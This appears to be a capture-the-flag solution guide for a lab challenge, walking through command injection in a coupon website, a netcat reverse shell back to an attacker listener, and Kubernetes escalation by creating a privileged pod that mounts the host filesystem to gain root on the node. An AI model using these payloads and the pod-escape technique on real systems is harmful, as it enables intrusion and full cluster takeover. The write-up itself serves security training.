# Discounted Route to Rescue

*Solution Guide*

## Overview

Exploit a command injection vulnerability in the website `coupons.merch.codes` to gain access to a pod hosting the website. Read the first vital document. Using permissions and escaping the pod, gain access to the master node. Retrieve the second document critical in recovering the infiltrated friendly Aurellian ship.

## Question 1

*File in /var/www/html/ container directory*

The challenge guide tells us to investigate the website `coupons.merch.codes`. After investigation, we see it is vulnerable to command injection. 

1. To test if `coupons.merch.codes` is vulnerable to command injection, enter the following in the text field: 

```bash
1; whoami
```

The output should be a random "coupon" followed by the user `nobody` in a new line. 
Since the field is vulnerable to command injection, and we are told that we infiltrated the network, we can try to get a shell inside the system hosting `coupons.merch.codes`.

2. On the Kali VM, open a terminal and enter: 

```bash
nc -lvp 5555
```

3. On `coupons.merch.codes`, enter the following in the text field and click **Retrieve**. Make sure to change the IP address to match the one in your system.

```bash
; nc 10.5.5.105 5555 -e /bin/bash
```

4. After clicking **Retrieve**,  go back to your terminal. Notice you obtained a connection. 
5. Enter the following to make sure you are connected: 

```bash
whoami
```
You get the user of the system: `nobody`.

6. The first document we need is in the `/var/www/html/` directory. Enter the following to see what's in that directory: 

```bash
ls -la /var/www/html/
```

You will see a document called `flag_one.txt`.

7. Type the following to see its contents: 

```bash
cat /var/www/html/flag_one.txt
```

The output is the answer to Question 1. 

### Note on obtaining a shell

Because the text field has a command injection vulnerability, you could've entered the command below to get the first flag without obtaining a shell. However, obtaining a shell is needed to answer the second question.

```bash
1; ls -la /var/www/html/
```

```bash
1; less /var/www/html/flag_one.txt
```
## Question 2

*File in /root/ node directory*

To verify if you are inside a container, look at the environment variables of the system using the shell you opened before. 

1. Inside the shell, enter the following:

``` bash
env
```

You will notice environment variables such as `KUBERNETES_PORT`, and `COUPONS_SERVICE_SERVICE_PORT`, among others. This indicates you are inside a Pod. Now that you know this, you can access the Kubernetes API using **kubectl**. 

2. Enter the following to know if `kubectl` is installed in the container. 

``` bash
kubectl -h 
```

You will see the help page for the `kubectl` command. 

3. Enter the following to display the Pods: 

```bash
kubectl get pods
```

You will receive an output that looks similar to this one: 
```bash
NAME                       READY   STATUS    RESTARTS   AGE
tools                      1/1     Running   0          16m
coupons-588ff9b758-bslrh   1/1     Running   0          15m
```

This means we have permissions to see Pods. 

4. To see how the `coupons` Pod was created, examine its yaml file: 

```bash
kubectl get pods coupons-588ff9b758-bslrh -o yaml 
```

You should get an output like this (excluding line numbers because we added those for reference in later steps). 


```yaml
1   apiVersion: v1
2   kind: Pod
3   metadata:
4     creationTimestamp: "2023-05-18T11:48:45Z"
5     generateName: coupons-588ff9b758-
6     labels:
7       app: coupons
8       pod-template-hash: 588ff9b758
9     name: coupons-588ff9b758-bslrh
10    namespace: coupons
11    ownerReferences:
12    - apiVersion: apps/v1
13      blockOwnerDeletion: true
14      controller: true
15      kind: ReplicaSet
16      name: coupons-588ff9b758
17      uid: 2df380a2-4f70-49af-896e-72b6d0e0628c
18    resourceVersion: "398075"
19    uid: 8ddbddc1-d054-404f-9ff0-ecc212f311f5
20  spec:
21    containers:
22    - image: registry.merch.codes:5000/coupons:latest
23      imagePullPolicy: Always
24      name: coupons
25      ports:
26      - containerPort: 8080
27        protocol: TCP
28      resources: {}
29      terminationMessagePath: /dev/termination-log
30      terminationMessagePolicy: File
31      volumeMounts:
32      - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
33        name: kube-api-access-627qv
34        readOnly: true
35    dnsPolicy: ClusterFirst
36    enableServiceLinks: true
37    nodeName: k3s-server
38    preemptionPolicy: PreemptLowerPriority
39    priority: 0
40    restartPolicy: Always
41    schedulerName: default-scheduler
42    securityContext: {}
43    serviceAccount: coupons-sa
44    serviceAccountName: coupons-sa
45    terminationGracePeriodSeconds: 30
46    tolerations:
47    - effect: NoExecute
48      key: node.kubernetes.io/not-ready
49      operator: Exists
50      tolerationSeconds: 300
51    - effect: NoExecute
52      key: node.kubernetes.io/unreachable
53      operator: Exists
54      tolerationSeconds: 300
55    volumes:
56    - name: kube-api-access-627qv
57      projected:
58        defaultMode: 420
59        sources:
60        - serviceAccountToken:
61            expirationSeconds: 3607
62            path: token
63        - configMap:
64            items:
65            - key: ca.crt
66              path: ca.crt
67            name: kube-root-ca.crt
68        - downwardAPI:
69            items:
70            - fieldRef:
71                apiVersion: v1
72                fieldPath: metadata.namespace
73              path: namespace
74  status:
75    conditions:
76    - lastProbeTime: null
77      lastTransitionTime: "2023-05-18T11:48:45Z"
78      status: "True"
79      type: Initialized
80    - lastProbeTime: null
81      lastTransitionTime: "2023-05-18T11:48:46Z"
82      status: "True"
83      type: Ready
84    - lastProbeTime: null
85      lastTransitionTime: "2023-05-18T11:48:46Z"
86      status: "True"
87      type: ContainersReady
88    - lastProbeTime: null
89      lastTransitionTime: "2023-05-18T11:48:45Z"
90      status: "True"
91      type: PodScheduled
92    containerStatuses:
93    - containerID: containerd://139cc17cdc15d899c5563e4cbc3fcf761405c1a428bdac4e73e3807943c3c9a1
94      image: registry.merch.codes:5000/coupons:latest
95      imageID: registry.merch.codes:5000/coupons@sha256:bbe946400aac30be2a4439ec3b40ad5356ff6e9fa28a0ca743d3a8459d96d8d0
96      lastState: {}
97      name: coupons
98      ready: true
99      restartCount: 0
100     started: true
101     state:
102       running:
103         startedAt: "2023-05-18T11:48:45Z"
104   hostIP: 10.3.3.10
105   phase: Running
106   podIP: 10.42.1.207
107   podIPs:
108   - ip: 10.42.1.207
109   qosClass: BestEffort
111   startTime: "2023-05-18T11:48:45Z"
```

Important information we can extract from the yaml file: 

- The Pod is found on the `coupons` namespace (line 10). 
- The Pod is running with a service account called `coupons-sa` (line 44).
- The image is pulled from `registry.merch.codes:5000/coupons:latest` (line 94).
- The host IP address is 10.3.3.10 (line 104).

Because the Pod is running with a service account, you want to know what you can do with `kubectl`.

5. Enter the following command: 

``` bash
kubectl auth can-i --list -n coupons
```

```
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods/attach                                     []                                    []               [get list watch create update patch delete deletecollection]
pods/exec                                       []                                    []               [get list watch create update patch delete deletecollection]
pods/portforward                                []                                    []               [get list watch create update patch delete deletecollection]
pods/proxy                                      []                                    []               [get list watch create update patch delete deletecollection]
pods                                            []                                    []               [get list watch create update patch delete deletecollection]
deployments.apps                                []                                    []               [get list watch create update patch delete deletecollection]
deployments.extensions                          []                                    []               [get list watch create update patch delete deletecollection]
nodes                                           []                                    []               [get list watch]
                                                [/.well-known/openid-configuration]   []               [get]
                                                [/api/*]                              []               [get]
                                                [/api]                                []               [get]
                                                [/apis/*]                             []               [get]
                                                [/apis]                               []               [get]
                                                [/healthz]                            []               [get]
                                                [/healthz]                            []               [get]
                                                [/livez]                              []               [get]
                                                [/livez]                              []               [get]
                                                [/openapi/*]                          []               [get]
                                                [/openapi]                            []               [get]
                                                [/openid/v1/jwks]                     []               [get]
                                                [/readyz]                             []               [get]
                                                [/readyz]                             []               [get]
                                                [/version/]                           []               [get]
                                                [/version/]                           []               [get]
                                                [/version]                            []               [get]
                                                [/version]                            []               [get]
```

Based on the output, we can do nearly anything we want related to Pods including creating new Pods.

Here is how we created a Pod, while also mounting the host filesystem, and then executing into it. This is the `yaml` file. 

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: ubuntu
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
```

So, to  create this Pod, we need an image with tools. There was another Pod in the `coupons` namespace called `tools` that we might be able to use. 

6. Enter the following command to view what image the `tools` pod is using. 

```bash
kubectl get pods tools -o yaml
```

```yaml
1 apiVersion: v1
2 kind: Pod
3 metadata:
4   annotations:
5     kubectl.kubernetes.io/last-applied-configuration: |
6       {"apiVersion":"v1","kind":"Pod","metadata":{"annotations":{},"name":"tools","namespace":"coupons"},"spec":{"containers":[{"command":["sleep","infinity"],"image":"registry.merch.codes:5000/tools:latest","imagePullPolicy":"IfNotPresent","name":"tools"}],"restartPolicy":"Always"}}
7   creationTimestamp: "2023-05-18T11:47:55Z"
8   name: tools
9   namespace: coupons
10   resourceVersion: "397959"
11   uid: e3a13f05-0cdf-4281-9989-b7decfd44ab8
12 spec:
13   containers:
14   - command:
15     - sleep
16     - infinity
17     image: registry.merch.codes:5000/tools:latest
18     imagePullPolicy: IfNotPresent
19     name: tools
20     resources: {}
21     terminationMessagePath: /dev/termination-log
22     terminationMessagePolicy: File
23     volumeMounts:
24     - mountPath: /var/run/secrets/kubernetes.io/serviceaccount
25       name: kube-api-access-hwfkd
26       readOnly: true
27   dnsPolicy: ClusterFirst
28   enableServiceLinks: true
29   nodeName: k3s-server
30   preemptionPolicy: PreemptLowerPriority
31   priority: 0
32   restartPolicy: Always
33   schedulerName: default-scheduler
34   securityContext: {}
35   serviceAccount: default
36   serviceAccountName: default
37   terminationGracePeriodSeconds: 30
38   tolerations:
39   - effect: NoExecute
40     key: node.kubernetes.io/not-ready
41     operator: Exists
42     tolerationSeconds: 300
43   - effect: NoExecute
44     key: node.kubernetes.io/unreachable
45     operator: Exists
46     tolerationSeconds: 300
47   volumes:
48   - name: kube-api-access-hwfkd
49     projected:
50       defaultMode: 420
51       sources:
52       - serviceAccountToken:
53           expirationSeconds: 3607
54           path: token
55       - configMap:
56           items:
57           - key: ca.crt
58             path: ca.crt
59           name: kube-root-ca.crt
60       - downwardAPI:
61           items:
62           - fieldRef:
63               apiVersion: v1
64               fieldPath: metadata.namespace
65             path: namespace
66 status:
67   conditions:
68   - lastProbeTime: null
69     lastTransitionTime: "2023-05-18T11:47:55Z"
70     status: "True"
71     type: Initialized
72   - lastProbeTime: null
73     lastTransitionTime: "2023-05-18T11:47:57Z"
74     status: "True"
75     type: Ready
76   - lastProbeTime: null
77     lastTransitionTime: "2023-05-18T11:47:57Z"
78     status: "True"
79     type: ContainersReady
80   - lastProbeTime: null
81     lastTransitionTime: "2023-05-18T11:47:55Z"
82     status: "True"
83     type: PodScheduled
84   containerStatuses:
85   - containerID: containerd://ee5f262614e65916fe2312e3c28a0e99ce2dffe2144520924f48d6b8bd628a68
86     image: registry.merch.codes:5000/tools:latest
87     imageID: registry.merch.codes:5000/tools@sha256:3efbfd3156722bc0288dd83afee2da3acea806832cd55c1e163fe1961ec6977d
88     lastState: {}
89     name: tools
90     ready: true
91     restartCount: 0
92     started: true
93     state:
94       running:
95         startedAt: "2023-05-18T11:47:56Z"
96   hostIP: 10.3.3.10
97   phase: Running
98   podIP: 10.42.1.206
99   podIPs:
100   - ip: 10.42.1.206
101   qosClass: BestEffort
102   startTime: "2023-05-18T11:47:55Z"
```

It is pulling an image from `registry.merch.codes:5000/tools:latest` (line 86). Let's use that for our new malicious Pod. 

7. Enter the following: 

```bash
kubectl apply -f- <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: everything-allowed-exec-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: everything-allowed-pod
    image: registry.merch.codes:5000/tools:latest
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
  volumes:
  - name: noderoot
    hostPath:
      path: /
EOF
```

You should get: 

```
pod/everything-allowed-exec-pod created
```


8. Execute inside that pod: 

```bash
kubectl exec -it everything-allowed-exec-pod -- chroot /host bash
```

9. Enter the following command to see if we succeeded:

```bash
whoami
```

As you can see, we have `root`.

10. Verify you are inside the master node by checking the IP address: 

```bash
ip a
```

You will get **10.3.3.10**, which matches the host ip we found earlier. Next, search for the required file in the `/root/` directory. 

11. To move inside the root directory, enter: 

```bash
cd /root/
```

12. To see which files we have on the root directory, enter:

```bash
ls -la
```

You should see a file called `flag_two.txt`. Let's read it!

```bash
cat flag_two.txt
```

The output is the answer to Question 2 and the last flag.
